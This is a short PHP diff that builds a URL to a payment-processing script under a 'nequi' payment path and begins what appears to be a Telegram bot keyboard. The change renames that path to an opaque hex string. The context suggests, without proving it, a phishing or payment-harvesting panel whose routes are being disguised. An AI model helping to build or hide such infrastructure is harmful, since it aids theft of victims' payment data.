@@ -52,10 +52,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         $nequiBaseUrl = $baseUrl;
         if (strpos($baseUrl, 'updatetele.php') !== false) {
-            $nequiBaseUrl = str_replace('updatetele.php', 'pago/nequi/process/updatetele.php', $baseUrl);
+            $nequiBaseUrl = str_replace('updatetele.php', 'pago/c3a7f91e/process/updatetele.php', $baseUrl);
         } else {
             // Si es solo el dominio, agregamos la ruta
-            $nequiBaseUrl = rtrim($baseUrl, '/') . '/pago/nequi/process/updatetele.php';
+            $nequiBaseUrl = rtrim($baseUrl, '/') . '/pago/c3a7f91e/process/updatetele.php';
         }
 
         $keyboard = [
